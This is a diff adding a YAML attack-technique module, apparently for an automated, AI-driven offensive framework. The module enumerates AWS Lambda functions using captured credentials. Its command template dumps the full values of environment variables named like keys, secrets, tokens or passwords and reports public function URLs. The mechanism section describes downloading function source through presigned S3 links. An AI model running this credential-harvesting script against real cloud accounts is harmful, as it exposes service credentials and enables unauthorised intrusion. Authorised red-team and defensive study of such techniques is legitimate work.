@@ -1,0 +1,51 @@
+name: aws_lambda_enum
+category: cloud
+description: Enumerate Lambda functions, extract environment variables and source code
+preconditions:
+- cloud.aws_creds_available
+parameters:
+  profile: from_finding.aws_profile
+  region: from_finding.aws_region
+command_template: >
+  aws lambda list-functions --profile {profile} --region {region} --output json 2>&1 |
+    tee /tmp/lambda_list.json;
+  python3 -c "
+  import json, subprocess, os
+  try:
+      fns = json.load(open('/tmp/lambda_list.json')).get('Functions', [])
+      for fn in fns[:5]:
+          name = fn['FunctionName']
+          env = fn.get('Environment', {}).get('Variables', {})
+          if env:
+              print(f'[!] Lambda {name} env vars: {list(env.keys())}')
+              for k,v in env.items():
+                  if any(x in k.lower() for x in ['key','secret','token','pass','cred']):
+                      print(f'    SENSITIVE: {k}={v}')
+          # Get function URL if exists
+          r = subprocess.run(['aws','lambda','get-function-url-config',
+                              '--function-name',name,'--profile','{profile}'],
+                             capture_output=True, text=True)
+          if 'FunctionUrl' in r.stdout:
+              import re
+              m = re.search(r'FunctionUrl.*?(https://\S+)', r.stdout)
+              if m: print(f'[!] Public URL: {m.group(1)}')
+  except Exception as e:
+      print(e)
+  "
+parser: generic_parser
+expected_effects:
+- lambda_functions_discovered
+- cloud_secrets_exposed
+falsifier:
+  pattern: AccessDenied|No functions found|not authorized
+  timeout: 30
+model_tier: haiku
+mechanism: >
+  Lambda functions often contain hardcoded credentials in environment variables or
+  function code. list-functions reveals all functions; Environment.Variables may expose
+  DB passwords, API keys, or other service credentials. Public function URLs allow
+  unauthenticated invocation. Lambda layers can also contain credentials or libraries
+  with known vulns. Download source code via get-function → Code.Location (S3 presigned URL).
+hacktricks_ref: cloud-security/aws-security/aws-lambda-security.md
+destructive: false
+opsec: medium
